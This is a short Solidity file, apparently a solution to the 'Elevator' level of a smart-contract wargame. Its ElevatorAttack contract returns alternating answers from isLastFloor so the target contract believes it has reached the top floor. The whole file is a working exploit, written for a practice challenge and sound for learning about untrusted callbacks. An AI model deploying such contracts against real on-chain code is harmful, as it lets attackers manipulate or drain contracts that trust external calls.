pragma solidity ^0.6.0;

import '../11-elevator/Elevator.sol';

contract ElevatorAttack {
    Elevator elevator;
    bool top = true;

    constructor(address target) public {
        elevator = Elevator(target);
    }

    function isLastFloor(uint256) external returns (bool) {
        top = !top;
        return top;
    }

    function attack(uint256 floor) external {
        elevator.goTo(floor);
    }
}
